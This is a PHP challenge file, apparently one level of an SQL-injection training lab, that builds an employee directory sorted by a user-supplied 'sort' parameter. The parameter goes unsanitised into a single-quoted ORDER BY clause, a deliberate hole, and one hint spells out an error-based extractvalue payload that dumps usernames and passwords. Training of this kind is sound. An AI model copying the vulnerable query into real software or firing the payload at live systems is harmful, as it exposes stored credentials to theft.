<?php
// Less-47 员工列表排序（单引号）
if (!defined('SQLI_MALL')) { die('forbidden'); }
return [
  'title' => '员工列表排序（单引号）',
  'desc'  => '行政部员工通讯录，按指定字段排序。',
  'method' => 'GET',
  'form' => ['method' => 'GET', 'fields' => array (
  'sort' => '排序字段',
), 'submit' => '查 询'],
  'difficulty' => 3,
  'task' => '单引号闭合的 ORDER BY 注入，报错注入提数',
  'hints' => array (
  0 => 'sort 被单引号包裹，报错会回显。',
  1 => 'ORDER BY 后注入与 WHERE 类似，报错函数照用，尾部注释即可。',
  2 => '示例：?sort=1\' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from oa_employee),0x7e))-- -',
),
  'run' => function ($app) {
    if (!isset($_GET['sort'])) return $app->info('请选择排序字段。');
    $sort = $_GET['sort'];
    $sql = "SELECT emp_no, name, dept FROM oa_employee ORDER BY '{$sort}'";
    $res = $app->q($sql);
    if (!$res) {
    return $app->note($app->error());
    }
    return $app->table($app->fetch_all($res), array (
  '工号' => 'emp_no',
  '姓名' => 'name',
  '所属部门' => 'dept',
));

  },
];
